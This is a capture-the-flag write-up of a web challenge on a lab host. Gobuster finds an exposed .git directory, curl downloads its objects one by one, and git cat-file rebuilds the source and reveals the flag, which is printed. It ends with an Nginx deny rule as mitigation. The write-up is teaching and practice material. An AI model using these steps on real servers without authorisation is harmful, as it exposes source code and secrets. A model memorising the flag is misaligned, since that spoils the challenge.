# 🏖️🧑‍💻 Hackers Holiday 2026 — Day 2: Concierge Briefing

> ⚠️ **Spoiler Warning:** This write-up contains the solution and flag for the Hackers Holiday 2026 Day 2 challenge.

## 📌 Challenge Overview

The Byte Lotus guest-experience platform was deployed in a hurry. The challenge hinted that **port 8080 was open** and that there were hidden resources worth investigating.

The objective was to:

> **Dump the exposed source code and find the flag.**

### Challenge Details

* **Category:** Web
* **Technique:** Directory Enumeration
* **Target:** `http://10.64.153.145:8080`
* **Objective:** Identify an exposed source-code repository and recover the flag

---

## 🔍 Step 1: Directory Enumeration

The challenge mentioned that **port 8080 was open**, so I began by enumerating directories and files on the web application using **Gobuster**.

```bash
gobuster dir -u http://10.64.153.145:8080 -w /usr/share/wordlists/dirb/common.txt
```

The scan returned the following result:

```text
/.git/HEAD            (Status: 200) [Size: 21]
```

This was a significant finding because the `.git` directory contains Git repository metadata, including:

* Commit history
* Source-code objects
* Branch information
* Previous versions of files
* Potentially sensitive developer information

The `200 OK` response indicated that the `.git` directory was publicly accessible.

![Gobuster identifies the exposed .git directory](images/gobuster-git-head.png)

---

## 🗂️ Step 2: Inspecting the Exposed Git Repository

I checked the contents of the exposed `HEAD` file:

```bash
curl -s http://10.64.153.145:8080/.git/HEAD
```

The repository was using the `main` branch, so I retrieved the branch reference:

```bash
curl -s http://10.64.153.145:8080/.git/refs/heads/main
```

This returned the latest commit hash:

```text
0f13550b4cb13e9f30c61d5b342c532d21e45bda
```

![Retrieving the main branch commit hash](images/main-branch-hash.png)

---

## 🧩 Step 3: Recovering the Git Commit Object

Git stores objects using the SHA-1 hash structure.

For the commit hash:

```text
0f13550b4cb13e9f30c61d5b342c532d21e45bda
```

Git separates the first two characters as the directory name:

```text
0f/
└── 13550b4cb13e9f30c61d5b342c532d21e45bda
```

I created the required Git object directory:

```bash
mkdir -p ~/byte-lotus-source/.git/objects/0f
```

I then downloaded the commit object:

```bash
curl -s http://10.64.153.145:8080/.git/objects/0f/13550b4cb13e9f30c61d5b342c532d21e45bda \
-o ~/byte-lotus-source/.git/objects/0f/13550b4cb13e9f30c61d5b342c532d21e45bda
```

Next, I recreated the `main` branch reference:

```bash
mkdir -p ~/byte-lotus-source/.git/refs/heads
```

```bash
echo "0f13550b4cb13e9f30c61d5b342c532d21e45bda" > ~/byte-lotus-source/.git/refs/heads/main
```

I also recreated the Git `HEAD` file:

```bash
echo "ref: refs/heads/main" > ~/byte-lotus-source/.git/HEAD
```

---

## 🌳 Step 4: Identifying the Repository Tree

After recreating the Git structure, I inspected the commit:

```bash
cd ~/byte-lotus-source
```

```bash
git cat-file -p 0f13550b4cb13e9f30c61d5b342c532d21e45bda
```

The output showed the tree hash:

```text
tree fa45dbd69394ea9e13683d9efb6a0220daac59d4
author night-shift <dev@byte-lotus.internal>

initial Byte Lotus guest platform
```

The tree object contains the names and hashes of the files stored in the repository.

![Inspecting the recovered Git commit](images/git-commit-tree.png)

---

## 📂 Step 5: Recovering the Source-Code File List

I downloaded the tree object:

```bash
mkdir -p .git/objects/fa
```

```bash
curl -s http://10.64.153.145:8080/.git/objects/fa/45dbd69394ea9e13683d9efb6a0220daac59d4 \
-o .git/objects/fa/45dbd69394ea9e13683d9efb6a0220daac59d4
```

I then inspected the tree:

```bash
git cat-file -p fa45dbd69394ea9e13683d9efb6a0220daac59d4
```

The repository contained three files:

```text
100644 blob a5965c580fee91d852e5b19a8290da02d2926523    README.md
100644 blob 2575ab073f67615a27135663ed36794c2d2584fb    app.js
100644 blob 0a12caa4e52a965e89e5eccf5760924b21aacbf7    index.html
```

![Listing the recovered source-code files](images/git-tree-files.png)

---

## 🚩 Step 6: Recovering the Flag

The `README.md` file appeared to contain internal documentation, so I downloaded its Git blob object.

```bash
mkdir -p .git/objects/a5
```

```bash
curl -s http://10.64.153.145:8080/.git/objects/a5/965c580fee91d852e5b19a8290da02d2926523 \
-o .git/objects/a5/965c580fee91d852e5b19a8290da02d2926523
```

I then displayed the contents of the file:

```bash
git cat-file -p a5965c580fee91d852e5b19a8290da02d2926523
```

The output revealed an internal staging note containing the flag:

```text
# Byte Lotus — Guest Experience Platform

Internal staging repository for the guest app and concierge personalization
service. Do not deploy this folder to production.

Staging flag (remove before launch): THM{byt3_l0tus_n3v3r_f0rg3ts}
```

![Flag discovered in the exposed README.md file](images/flag-found.png)

---

## 🏁 Flag

```text
THM{byt3_l0tus_n3v3r_f0rg3ts}
```

---

## 🛠️ Tools Used

| Tool       | Purpose                                                |
| ---------- | ------------------------------------------------------ |
| Gobuster   | Enumerated hidden directories and files                |
| cURL       | Retrieved exposed Git metadata and Git objects         |
| Git        | Inspected the recovered commit, tree, and blob objects |
| Kali Linux | Performed the investigation                            |

---

## 🧠 Key Takeaways

This challenge demonstrated the security risks of exposing a `.git` directory on a production web server.

An exposed Git repository may allow an attacker to recover:

* Application source code
* Internal documentation
* Commit history
* Deleted or older versions of files
* API keys and credentials
* Configuration files
* Sensitive developer notes

Even though the application itself may appear secure, publicly accessible Git metadata can expose information that was never intended to be available to users.

### Recommended Mitigation

Web servers should be configured to deny public access to `.git` directories and other sensitive development files.

For example, in Nginx:

```nginx
location ~ /\.git {
    deny all;
}
```

---

## ✅ Challenge Status

**Day 2 Complete!** 🎉

The exposed `.git` directory allowed the Git repository metadata and source-code files to be recovered. The flag was found inside the repository's internal `README.md` file.

**On to the next challenge! 🔥**
